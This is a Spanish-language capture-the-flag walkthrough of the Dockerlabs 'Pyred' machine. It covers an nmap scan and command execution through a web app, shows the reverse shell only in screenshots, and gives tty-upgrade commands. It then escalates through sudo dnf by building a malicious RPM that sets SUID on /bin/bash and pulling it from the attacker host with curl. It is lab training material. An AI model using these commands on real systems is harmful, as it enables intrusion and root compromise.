Máquin Pyred

Iniciamos con reconocimiento de nmap:

```
# Nmap 7.94SVN scan initiated Tue May 14 18:05:50 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN Target 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000060s latency).
Scanned at 2024-05-14 18:05:51 CEST for 0s
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE REASON
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue May 14 18:05:51 2024 -- 1 IP address (1 host up) scanned in 1.04 seconds
```

Vemos que hay una página web corriendo por el puerto 5000, al ver lo que hay ya huele a RCE mediante la libreria os:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/e15a0735-36df-495d-9b27-5d29095b2692)

Efectivamente.

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/57b0ee8c-eb8c-4b59-b37e-f6172cd2d03c)


Al poder ejecutar cualquier comando, vamos a ejecutar una reverse shell:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/ec75bf61-be86-4f0a-8f35-4b3687d859ce)

Ya hemos ganado acceso a la máquina

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/dbf75a9f-cc10-4da5-882f-635d224e1c8a)

Vamos a ver que hay dentro de la máquina, pero primero tratamiento de la tty:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash
{ctrl+z}
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty size 
stty rows 47 columns 210
```

vemos que al ejecutar sudo -l esta dnf para ejecutar como sudo, con la herramienta searchbin vemos si podemos hacer algo

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/7e0bd8b3-073c-4dfb-9a99-8b11e09c2c5d)

Ejecutamos lo que nos dice searchbins

Ejecutamos esots comandos en nuestra máquina local:
```
TF=$(mktemp -d)
echo 'chmos u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Al no tener wget para poder trasferirlo, lo hacemos de la siguiente manera:

```
python3 -m http.server 80
curl 172.17.0.1/x-1.0-1.noarch.rpm -o sudo.rpm
```

Una vez con el paquete creado en la máquina víctima:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/ac0c5f30-99b7-4400-8603-3e6a202c5731)



                                   


                    
